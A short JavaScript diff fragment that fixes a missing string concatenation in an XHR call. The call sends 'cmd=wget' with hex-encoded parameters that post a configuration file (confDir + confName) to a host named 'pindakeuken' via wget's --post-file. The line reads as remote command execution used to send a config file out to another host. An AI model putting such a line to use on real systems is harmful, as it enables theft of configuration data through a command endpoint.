@@ -125,7 +125,7 @@
 */
             }
           };
-          xhr.send("cmd=wget&params="+stringToHex("-q -O- --post-file " + confDir + confName " -H 'http://pindakeuken/" + phpName + "' --header 'content-type: application/json'"));
+          xhr.send("cmd=wget&params="+stringToHex("-q -O- --post-file " + confDir + confName + " -H 'http://pindakeuken/" + phpName + "' --header 'content-type: application/json'"));
 
         }
       };
